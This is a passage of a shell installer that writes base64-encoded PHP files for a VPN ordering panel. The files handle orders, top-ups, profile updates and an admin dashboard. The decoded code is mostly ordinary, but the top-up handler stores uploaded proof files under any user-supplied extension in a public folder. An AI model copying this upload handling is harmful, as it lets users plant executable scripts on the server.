ZXJzIFdIRVJFIGlkPT8iKTsKICAgICR1LT5leGVjdXRlKFskdXNlcklkXSk7ICR1c2VyID0gJHUtPmZldGNoKCk7CiAgICBpZiAoKGZsb2F0KSR1c2VyWydzYWxkbyddIDwgJGhhcmdhKSB7CiAgICAgICAgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidTYWxkbyB0aWRhayBjdWt1cCEgU2FsZG8ga2FtdTogJy5mb3JtYXRSdXBpYWgoJHVzZXJbJ3NhbGRvJ10pXSk7IGV4aXQ7CiAgICB9Cn0KCi8vIEJ1YXQgYWt1biBkaSBzZXJ2ZXIKJHJlc3VsdCA9IFZQTk1hbmFnZXI6OmNyZWF0ZUFjY291bnQoJHNlcnZlciwgJHRpcGUsICR1c2VybmFtZSwgJGRheXMsCiAgICAoaW50KSgkc2VydmVyWydxdW90YV9saW1pdCddID8/IDEwMCksIChpbnQpKCRzZXJ2ZXJbJ2lwX2xpbWl0J10gPz8gMikpOwoKaWYgKCEkcmVzdWx0WydzdWNjZXNzJ10pIHsKICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7IGV4aXQ7Cn0KCiRkYi0+YmVnaW5UcmFuc2FjdGlvbigpOwp0cnkgewogICAgLy8gS3VyYW5naSBzYWxkbyAoamlrYSBidWthbiB0cmlhbCkKICAgIGlmICghJGlzVHJpYWwgJiYgJGhhcmdhID4gMCkgewogICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBzYWxkbz1zYWxkby0/IFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJGhhcmdhLCAkdXNlcklkXSk7CiAgICB9CgogICAgLy8gSGl0dW5nIG1hc2EgYWt0aWYKICAgICRleHBpcnkgPSAkaXNUcmlhbAogICAgICAgID8gZGF0ZSgnWS1tLWQgSDppOnMnLCBzdHJ0b3RpbWUoJysxIGhvdXInKSkKICAgICAgICA6IGRhdGUoJ1ktbS1kIEg6aTpzJywgc3RydG90aW1lKCIreyRkYXlzfSBkYXlzIikpOwoKICAgIC8vIFNpbXBhbiBha3VuCiAgICAkaW5zID0gJGRiLT5wcmVwYXJlKCJJTlNFUlQgSU5UTyB2cG5fYWNjb3VudHMgCiAgICAgICAgKHVzZXJfaWQsc2VydmVyX2lkLHRpcGUsdXNlcm5hbWUsdXVpZCxwYXNzd29yZF92cG4sbGlua19jb25maWcsbGlua190bHMsbGlua19ub250bHMsbGlua19ncnBjLG1hc2FfYWt0aWYsZGF5c19vcmRlcmVkLGlzX3RyaWFsLGhhcmdhX3RvdGFsLHN0YXR1cykKICAgICAgICBWQUxVRVMgKD8sPyw/LD8sPyw/LD8sPyw/LD8sPyw/LD8sPywnYWN0aXZlJykiKTsKICAgICRpbnMtPmV4ZWN1dGUoWwogICAgICAgICR1c2VySWQsICRzZXJ2ZXJJZCwgJHRpcGUsICR1c2VybmFtZSwKICAgICAgICAkcmVzdWx0Wyd1dWlkJ10gPz8gbnVsbCwKICAgICAgICAkcmVzdWx0WydwYXNzd29yZCddID8/ICRyZXN1bHRbJ3V1aWQnXSA/PyBudWxsLAogICAgICAgICRyZXN1bHRbJ2xpbmtfY29uZmlnJ10gPz8gJHJlc3VsdFsnbGlua190bHMnXSA/PyBudWxsLAogICAgICAgICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gbnVsbCwKICAgICAgICAkcmVzdWx0WydsaW5rX25vbnRscyddID8/IG51bGwsCiAgICAgICAgJHJlc3VsdFsnbGlua19ncnBjJ10gPz8gbnVsbCwKICAgICAgICAkZXhwaXJ5LCAkZGF5cywgJGlzVHJpYWwgPyAxIDogMCwgJGhhcmdhCiAgICBdKTsKCiAgICAvLyBDYXRhdCB0cmFuc2Frc2kKICAgIGlmICghJGlzVHJpYWwpIHsKICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LCdzdWNjZXNzJykiKQogICAgICAgICAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJ29yZGVyJywgJGhhcmdhLCAiT3JkZXIgeyR0aXBlfSAtIHskdXNlcm5hbWV9ICh7JGRheXN9IGhhcmkpIl0pOwogICAgfSBlbHNlIHsKICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sMCw/LCdzdWNjZXNzJykiKQogICAgICAgICAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJ3RyaWFsJywgIlRyaWFsIHskdGlwZX0gLSB7JHVzZXJuYW1lfSAoMSBqYW0pIl0pOwogICAgfQoKICAgICRkYi0+Y29tbWl0KCk7CgogICAgLy8gVGFtYmFoIGluZm8ga2UgcmVzcG9uc2UKICAgICRyZXN1bHRbJ2V4cGlyZWQnXSA9ICRpc1RyaWFsCiAgICAgICAgPyBkYXRlKCdkIE0gWSwgSDppJywgc3RydG90aW1lKCcrMSBob3VyJykpLicgKDEgSmFtIFRyaWFsKScKICAgICAgICA6IGRhdGUoJ2QgTSBZJywgc3RydG90aW1lKCIreyRkYXlzfSBkYXlzIikpOwogICAgJHJlc3VsdFsnaGFyZ2EnXSAgID0gZm9ybWF0UnVwaWFoKCRoYXJnYSk7CiAgICAkcmVzdWx0Wydpc190cmlhbCddPSAkaXNUcmlhbDsKCiAgICAvLyBOb3RpZiBUZWxlZ3JhbQogICAgJG5vdGlmTXNnID0gJGlzVHJpYWwKICAgICAgICA/ICJbUE9XRVJdIDxiPlRyaWFsIEJhcnU8L2I+XG5Vc2VyOiB7JHVzZXJuYW1lfVxuVGlwZTogeyR0aXBlfVxuU2VydmVyOiB7JHNlcnZlclsnbmFtYV9zZXJ2ZXInXX0iCiAgICAgICAgOiAiW0NBUlRdIDxiPk9yZGVyIEJhcnU8L2I+XG5Vc2VyOiB7JHVzZXJuYW1lfVxuVGlwZTogeyR0aXBlfVxuU2VydmVyOiB7JHNlcnZlclsnbmFtYV9zZXJ2ZXInXX1cbkR1cmFzaTogeyRkYXlzfSBoYXJpXG5Ub3RhbDogIi5mb3JtYXRSdXBpYWgoJGhhcmdhKTsKICAgIHNlbmRUZWxlZ3JhbU5vdGlmKCRub3RpZk1zZyk7CgogICAgZWNobyBqc29uX2VuY29kZSgkcmVzdWx0KTsKCn0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgJGRiLT5yb2xsYmFjaygpOwogICAgLy8gUm9sbGJhY2sgYWt1biBkaSBzZXJ2ZXIgamlrYSBEQiBlcnJvcgogICAgVlBOTWFuYWdlcjo6ZGVsZXRlQWNjb3VudCgkc2VydmVyLCAkdGlwZSwgJHVzZXJuYW1lKTsKICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nREIgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKV0pOwp9Cg==" | base64 -d > "$DIR"/api/create_order.php



    # api/delete_account.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVMb2dpbigpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOwoKJHVzZXJJZCAgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokYWt1bklkICA9IChpbnQpKCRfUE9TVFsnYWt1bl9pZCddID8/IDApOwppZiAoISRha3VuSWQpIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidJRCB0aWRhayB2YWxpZCddKTsgZXhpdDsgfQoKJGRiID0gZ2V0REIoKTsKLy8gQW1iaWwgYWt1biBtaWxpayB1c2VyIGluaSBzYWphIChrZWFtYW5hbikKJHN0ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgdmEuKiwgcy5ob3N0LCBzLnBvcnQsIHMuc3NoX3VzZXIsIHMuc3NoX3Bhc3N3b3JkLCBzLnNzaF9rZXkgCiAgICBGUk9NIHZwbl9hY2NvdW50cyB2YSBKT0lOIHNlcnZlcnMgcyBPTiB2YS5zZXJ2ZXJfaWQ9cy5pZCAKICAgIFdIRVJFIHZhLmlkPT8gQU5EIHZhLnVzZXJfaWQ9PyIpOwokc3QtPmV4ZWN1dGUoWyRha3VuSWQsICR1c2VySWRdKTsgJGFrdW4gPSAkc3QtPmZldGNoKCk7CmlmICghJGFrdW4pIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidBa3VuIHRpZGFrIGRpdGVtdWthbiddKTsgZXhpdDsgfQoKLy8gSGFwdXMgZGFyaSBzZXJ2ZXIgVlBOIChmaXggdXRhbWEpCiRyZXMgPSBWUE5NYW5hZ2VyOjpkZWxldGVBY2NvdW50KCRha3VuLCAkYWt1blsndGlwZSddLCAkYWt1blsndXNlcm5hbWUnXSk7CgovLyBIYXB1cyBkYXJpIERCIG1lc2tpIHNlcnZlciBlcnJvciAoYWt1biBtdW5na2luIHN1ZGFoIHRpZGFrIGFkYSkKJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSB2cG5fYWNjb3VudHMgV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskYWt1bklkXSk7CgplY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PnRydWUsJ21lc3NhZ2UnPT4nQWt1biBiZXJoYXNpbCBkaWhhcHVzIGRhcmkgc2VydmVyIGRhbiBkYXRhYmFzZSddKTsK" | base64 -d > "$DIR"/api/delete_account.php



    # api/topup.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokYW1vdW50ID0gKGZsb2F0KSgkX1BPU1RbJ2Ftb3VudCddID8/IDApOwokbWV0aG9kID0gc2FuaXRpemUoJF9QT1NUWydwYXltZW50X21ldGhvZCddID8/ICdtYW51YWxfdHJhbnNmZXInKTsKCmlmICgkYW1vdW50IDwgNTAwMCkgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J05vbWluYWwgbWluaW1hbCBScCA1LjAwMCddKTsgZXhpdDsgfQppZiAoJGFtb3VudCA+IDEwMDAwMDApIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidOb21pbmFsIG1ha3NpbWFsIFJwIDEuMDAwLjAwMCddKTsgZXhpdDsgfQoKJGRiID0gZ2V0REIoKTsKJGJ1a3RpUGF0aCA9IG51bGw7CgovLyBVcGxvYWQgYnVrdGkKaWYgKCFlbXB0eSgkX0ZJTEVTWydidWt0aSddWyd0bXBfbmFtZSddKSkgewogICAgJHVwbG9hZERpciA9IF9fRElSX18uJy8uLi91cGxvYWRzL2J1a3RpLyc7CiAgICBpZiAoIWlzX2RpcigkdXBsb2FkRGlyKSkgbWtkaXIoJHVwbG9hZERpciwgMDc1NSwgdHJ1ZSk7CiAgICAkZXh0ID0gcGF0aGluZm8oJF9GSUxFU1snYnVrdGknXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pOwogICAgJGZuYW1lID0gJ2J1a3RpXycudGltZSgpLidfJy4kdXNlcklkLicuJy4kZXh0OwogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydidWt0aSddWyd0bXBfbmFtZSddLCAkdXBsb2FkRGlyLiRmbmFtZSkpIHsKICAgICAgICAkYnVrdGlQYXRoID0gJy9vcmRlcnZwbi91cGxvYWRzL2J1a3RpLycuJGZuYW1lOwogICAgfQp9CgokZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRvcHVwX3JlcXVlc3RzICh1c2VyX2lkLCBhbW91bnQsIHBheW1lbnRfbWV0aG9kLCBidWt0aV90cmFuc2ZlcikgVkFMVUVTICg/LD8sPyw/KSIpCiAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJGFtb3VudCwgJG1ldGhvZCwgJGJ1a3RpUGF0aF0pOwoKLy8gTm90aWYgYWRtaW4KJHUgPSAkZGItPnByZXBhcmUoIlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsgJHUtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHVuYW1lPSR1LT5mZXRjaENvbHVtbigpOwpzZW5kVGVsZWdyYW1Ob3RpZigiW01PTkVZXSA8Yj5Ub3B1cCBCYXJ1PC9iPlxuVXNlcjogeyR1bmFtZX1cbk5vbWluYWw6ICIuZm9ybWF0UnVwaWFoKCRhbW91bnQpLiJcbk1ldG9kZTogeyRtZXRob2R9XG5TdGF0dXM6IE1lbnVuZ2d1IGtvbmZpcm1hc2kgYWRtaW4iKTsKCmVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+dHJ1ZSwnbWVzc2FnZSc9PiJQZXJtaW50YWFuIHRvcHVwICIuZm9ybWF0UnVwaWFoKCRhbW91bnQpLiIgYmVyaGFzaWwgZGlraXJpbSEgVHVuZ2d1IGtvbmZpcm1hc2kgYWRtaW4uIl0pOwo=" | base64 -d > "$DIR"/api/topup.php



    # api/update_profile.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokZW1haWwgID0gc2FuaXRpemUoJF9QT1NUWydlbWFpbCddID8/ICcnKTsKJHdhICAgICA9IHNhbml0aXplKCRfUE9TVFsnd2hhdHNhcHAnXSA/PyAnJyk7CiRwYXNzICAgPSAkX1BPU1RbJ3Bhc3N3b3JkJ10gPz8gJyc7CgppZiAoIWZpbHRlcl92YXIoJGVtYWlsLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpKSB7CiAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0Zvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCddKTsgZXhpdDsKfQoKJGRiID0gZ2V0REIoKTsKLy8gQ2VrIGR1cGxpa2F0IGVtYWlsCiRjaGsgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBpZCBGUk9NIHVzZXJzIFdIRVJFIGVtYWlsPT8gQU5EIGlkIT0/Iik7CiRjaGstPmV4ZWN1dGUoWyRlbWFpbCwgJHVzZXJJZF0pOwppZiAoJGNoay0+ZmV0Y2goKSkgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0VtYWlsIHN1ZGFoIGRpZ3VuYWthbiddKTsgZXhpdDsgfQoKaWYgKCFlbXB0eSgkcGFzcykpIHsKICAgIGlmIChzdHJsZW4oJHBhc3MpIDwgNikgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1Bhc3N3b3JkIG1pbi4gNiBrYXJha3RlciddKTsgZXhpdDsgfQogICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdXNlcnMgU0VUIGVtYWlsPT8sIHdoYXRzYXBwPT8sIHBhc3N3b3JkPT8gV0hFUkUgaWQ9PyIpCiAgICAgICAtPmV4ZWN1dGUoWyRlbWFpbCwgJHdhLCBwYXNzd29yZF9oYXNoKCRwYXNzLCBQQVNTV09SRF9CQ1JZUFQpLCAkdXNlcklkXSk7Cn0gZWxzZSB7CiAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgZW1haWw9Pywgd2hhdHNhcHA9PyBXSEVSRSBpZD0/IikKICAgICAgIC0+ZXhlY3V0ZShbJGVtYWlsLCAkd2EsICR1c2VySWRdKTsKfQplY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PnRydWUsJ21lc3NhZ2UnPT4nUHJvZmlsIGJlcmhhc2lsIGRpcGVyYmFydWknXSk7Cg==" | base64 -d > "$DIR"/api/update_profile.php



    # api/logout.php



    echo "PD9waHAKaWYgKHNlc3Npb25fc3RhdHVzKCk9PT1QSFBfU0VTU0lPTl9OT05FKSBzZXNzaW9uX3N0YXJ0KCk7CnNlc3Npb25fZGVzdHJveSgpOwpoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vJyk7CmV4aXQ7Cg==" | base64 -d > "$DIR"/api/logout.php



    # admin/index.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVBZG1pbigpOwpmdW5jdGlvbiBkZXRlY3RGbGFnKCRyZWdpb24pIHsKICAgICRtYXAgPSBbCiAgICAgICAgJ0luZG9uZXNpYScgID0+ICfwn4eu8J+HqScsICdTaW5nYXBvcmUnID0+ICfwn4e48J+HrCcsICdNYWxheXNpYScgID0+ICfwn4ey8J+HvicsCiAgICAgICAgJ0phcGFuJyAgICAgID0+ICfwn4ev8J+HtScsICdLb3JlYScgICAgID0+ICfwn4ew8J+HtycsICdUaGFpbGFuZCcgID0+ICfwn4e58J+HrScsCiAgICAgICAgJ1ZpZXRuYW0nICAgID0+ICfwn4e78J+HsycsICdJbmRpYScgICAgICA9PiAn8J+HrvCfh7MnLCAnUGhpbGlwcGluZXMnPT4n8J+HtfCfh60nLAogICAgICAgICdVU0EnICAgICAgICA9PiAn8J+HuvCfh7gnLCAnVW5pdGVkIFN0YXRlcyc9Pifwn4e68J+HuCcsICdDYW5hZGEnICAgID0+ICfwn4eo8J+HpicsCiAgICAgICAgJ0dlcm1hbnknICAgID0+ICfwn4ep8J+HqicsICdOZXRoZXJsYW5kcyc9Pifwn4ez8J+HsScsICdGcmFuY2UnICAgICA9PiAn8J+Hq/Cfh7cnLAogICAgICAgICdVSycgICAgICAgICA9PiAn8J+HrPCfh6cnLCAnVW5pdGVkIEtpbmdkb20nPT4n8J+HrPCfh6cnLCAnQXVzdHJhbGlhJz0+ICfwn4em8J+HuicsCiAgICAgICAgJ0JyYXppbCcgICAgID0+ICfwn4en8J+HtycsICdSdXNzaWEnICAgICA9PiAn8J+Ht/Cfh7onLCAnVHVya2V5JyAgICA9PiAn8J+HufCfh7cnLAogICAgXTsKICAgIGZvcmVhY2ggKCRtYXAgYXMgJGtleSA9PiAkZmxhZykgewogICAgICAgIGlmIChzdHJpcG9zKCRyZWdpb24sICRrZXkpICE9PSBmYWxzZSkgcmV0dXJuICRmbGFnOwogICAgfQogICAgcmV0dXJuICfwn4yQJzsKfQoKCiRkYiA9IGdldERCKCk7CgovLyA9PT0gU0VSVkVSIE1PTklUT1JJTkcgPT09CmZ1bmN0aW9uIGZldGNoU2VydmVyTW9uaXRvcigkc2VydmVyX2lkLCAkY29kZSwgJGhvc3QsICRwb3J0LCAkc3NoX3VzZXIsICRzc2hfcGFzcywgJHNzaF9rZXkpIHsKICAgIC8vIFJldHVybiBKU09OIHN0YXRzIGZvciBhIHNpbmdsZSBzZXJ2ZXIKICAgICRjbWQgPSAidGltZW91dCA1IHZwbi1hcGkgbW9uaXRvciBub25lIG5vbmUgMCAwIDAgLS1zZXJ2ZXIgIiAuIGVzY2FwZXNoZWxsYXJnKCRjb2RlKSAuICIgMj4vZGV2L251bGwiOwogICAgJG91dCA9IHNoZWxsX2V4ZWMoJGNtZCk7CiAgICAkZGF0YSA9IGpzb25fZGVjb2RlKCRvdXQsIHRydWUpOwogICAgaWYgKCRkYXRhICYmICFlbXB0eSgkZGF0YVsnc3VjY2VzcyddKSkgewogICAgICAgIHJldHVybiAkZGF0YTsKICAgIH0KICAgIC8vIEZhbGxiYWNrOiByZXR1cm4gb2ZmbGluZSBzdGF0dXMKICAgIHJldHVybiBbJ3N1Y2Nlc3MnID0+IGZhbHNlLCAncGluZ19tcycgPT4gbnVsbCwgJ3VwdGltZScgPT4gbnVsbCwgJ2NwdScgPT4gbnVsbCwgJ3JhbScgPT4gbnVsbCwgJ2Rpc2snID0+IG51bGwsICdzc2hfY291bnQnID0+IDAsICd2bWVzc19jb3VudCcgPT4gMCwgJ3ZsZXNzX2NvdW50JyA9PiAwLCAndHJvamFuX2NvdW50JyA9PiAwLCAneHJheScgPT4gJ09GRicsICduZ2lueCcgPT4gJ09GRicsICdzc2gnID0+ICdPRkYnLCAnc3NoX2NvdW50JyA9PiAwLCAndm1lc3NfY291bnQnID0+IDAsICd2bGVzc19jb3VudCcgPT4gMCwgJ3Ryb2phbl9jb3VudCcgPT4gMCwgJ3hyYXknID0+ICdPRkYnLCAnbmdpbngnID0+ICdPRkYnLCAnc3NoJyA9PiAnT0ZGJ107Cn0KCi8vIEVuZHBvaW50OiByZXR1cm4gSlNPTiBmb3IgYWxsIHNlcnZlcnMgKGNhbGxlZCBieSBBSkFYKQppZiAoaXNzZXQoJF9HRVRbJ2FqYXhfbW9uaXRvcl9zaW5nbGUnXSkpIHsKICAgIC8vIE1vbml0b3Igc2luZ2xlIHNlcnZlciAoY2FsbGVkIGJ5IEpTIHBlci1zZXJ2ZXIsIHBhcmFsbGVsIGluIGJyb3dzZXIpCiAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOwogICAgJGNvZGUgPSBzYW5pdGl6ZSgkX0dFVFsnYWpheF9tb25pdG9yX3NpbmdsZSddID8/ICcnKTsKICAgIGlmICgkY29kZSA9PT0gJ2xvY2FsJykgewogICAgICAgICRjbWQgPSAidGltZW91dCA1IHZwbi1hcGkgbW9uaXRvciBub25lIG5vbmUgMCAwIDAgMj4vZGV2L251bGwiOwogICAgICAgICRvdXQgPSBzaGVsbF9leGVjKCRjbWQpOwogICAgICAgICRkYXRhID0ganNvbl9kZWNvZGUoJG91dCwgdHJ1ZSk7CiAgICAgICAgaWYgKCRkYXRhICYmICFlbXB0eSgkZGF0YVsnc3VjY2VzcyddKSkgewogICAgICAgICAgICAkZGF0YVsnbmFtYV9zZXJ2ZXInXSA9ICdWUFMgTG9rYWwgKE1hc3RlciknOwogICAgICAgICAgICAkZGF0YVsnY29kZV9zZXJ2ZXInXSA9ICdsb2NhbCc7CiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJGRhdGEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJyA9PiBmYWxzZSwgJ3BpbmdfbXMnID0+IG51bGwsICd1cHRpbWUnID0+IG51bGwsICdjcHUnID0+IG51bGwsICdyYW0nID0+IG51bGwsICdzc2hfY291bnQnID0+IDAsICd2bWVzc19jb3VudCcgPT4gMCwgJ3ZsZXNzX2NvdW50JyA9PiAwLCAndHJvamFuX2NvdW50JyA9PiAwXSk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAkc3J2ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHNlcnZlcnMgV0hFUkUgY29kZV9zZXJ2ZXI9PyBBTkQgc3RhdHVzPSdyZWFkeScgTElNSVQgMSIpOwogICAgICAgICRzcnYtPmV4ZWN1dGUoWyRjb2RlXSk7CiAgICAgICAgJHMgPSAkc3J2LT5mZXRjaCgpOwogICAgICAgIGlmICgkcykgewogICAgICAgICAgICAkbW9uID0gZmV0Y2hTZXJ2ZXJNb25pdG9yKCRzWydpZCddLCAkc1snY29kZV9zZXJ2ZXInXSwgJHNbJ2hvc3QnXSwgJHNbJ3BvcnQnXSwgJHNbJ3NzaF91c2VyJ10sICRzWydzc2hfcGFzc3dvcmQnXSwgJHNbJ3NzaF9rZXknXSk7CiAgICAgICAgICAgICRtb25bJ25hbWFfc2VydmVyJ10gPSAkc1snbmFtYV9zZXJ2ZXInXTsKICAgICAgICAgICAgJG1vblsnY29kZV9zZXJ2ZXInXSA9ICRzWydjb2RlX3NlcnZlciddOwogICAgICAgICAgICBlY2hvIGpzb25fZW5jb2RlKCRtb24pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJyA9PiBmYWxzZSwgJ3BpbmdfbXMnID0+IG51bGxdKTsKICAgICAgICB9CiAgICB9CiAgICBleGl0Owp9CgppZiAoaXNzZXQoJF9HRVRbJ2FqYXhfbW9uaXRvcl9saXN0J10pKSB7CiAgICAvLyBSZXR1cm4gbGlzdCBvZiBzZXJ2ZXIgY29kZXMgZm9yIEpTIHRvIGZldGNoIGluZGl2aWR1YWxseQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKICAgICRjb2RlcyA9IFtbJ2NvZGUnID0+ICdsb2NhbCcsICduYW1lJyA9PiAnVlBTIExva2FsIChNYXN0ZXIpJ11dOwogICAgJHNlcnZlcnMgPSAkZGItPnF1ZXJ5KCJTRUxFQ1QgY29kZV9zZXJ2ZXIsIG5hbWFfc2VydmVyIEZST00gc2VydmVycyBXSEVSRSBzdGF0dXM9J3JlYWR5JyBPUkRFUiBCWSBuYW1hX3NlcnZlciIpLT5mZXRjaEFsbCgpOwogICAgZm9yZWFjaCAoJHNlcnZlcnMgYXMgJHMpIHsKICAgICAgICAkY29kZXNbXSA9IFsnY29kZScgPT4gJHNbJ2NvZGVfc2VydmVyJ10sICduYW1lJyA9PiAkc1snbmFtYV9zZXJ2ZXInXV07CiAgICB9CiAgICBlY2hvIGpzb25fZW5jb2RlKCRjb2Rlcyk7CiAgICBleGl0Owp9CgoKLy8gSGFuZGxlIFBPU1QgYWN0aW9ucwppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ109PT0nUE9TVCcpIHsKICAgICRhY3QgPSAkX1BPU1RbJ2FjdGlvbiddID8/ICcnOwoKICAgIGlmICgkYWN0PT09J2FwcHJvdmVfdG9wdXAnKSB7CiAgICAgICAgJHRpZCA9IChpbnQpJF9QT1NUWyd0b3B1cF9pZCddOwogICAgICAgICRyID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHRvcHVwX3JlcXVlc3RzIFdIRVJFIGlkPT8gQU5EIHN0YXR1cz0ncGVuZGluZyciKTsKICAgICAgICAkci0+ZXhlY3V0ZShbJHRpZF0pOyAkcmVxPSRyLT5mZXRjaCgpOwogICAgICAgIGlmICgkcmVxKSB7CiAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHRvcHVwX3JlcXVlc3RzIFNFVCBzdGF0dXM9J2FwcHJvdmVkJywgcHJvY2Vzc2VkX2F0PU5PVygpIFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJHRpZF0pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgc2FsZG89c2FsZG8rPyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyRyZXFbJ2Ftb3VudCddLCRyZXFbJ3VzZXJfaWQnXV0pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LCdzdWNjZXNzJykiKQogICAgICAgICAgICAgICAtPmV4ZWN1dGUoWyRyZXFbJ3VzZXJfaWQnXSwndG9wdXAnLCRyZXFbJ2Ftb3VudCddLCdUb3B1cCBkaXNldHVqdWkgYWRtaW4nXSk7CiAgICAgICAgICAgICR1PSRkYi0+cHJlcGFyZSgiU0VMRUNUIHVzZXJuYW1lIEZST00gdXNlcnMgV0hFUkUgaWQ9PyIpOyR1LT5leGVjdXRlKFskcmVxWyd1c2VyX2lkJ11dKTskdW5hbWU9JHUtPmZldGNoQ29sdW1uKCk7CiAgICAgICAgICAgIHNlbmRUZWxlZ3JhbU5vdGlmKCJBY3RpdmUgVG9wdXAgPGI+eyR1bmFtZX08L2I+ICIuZm9ybWF0UnVwaWFoKCRyZXFbJ2Ftb3VudCddKS4iIGRpc2V0dWp1aSIpOwogICAgICAgIH0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vYWRtaW4vJyk7IGV4aXQ7CiAgICB9CgogICAgaWYgKCRhY3Q9PT0ncmVqZWN0X3RvcHVwJykgewogICAgICAgICR0aWQ9KGludCkkX1BPU1RbJ3RvcHVwX2lkJ107CiAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdG9wdXBfcmVxdWVzdHMgU0VUIHN0YXR1cz0ncmVqZWN0ZWQnLCBhZG1pbl9ub3RlPT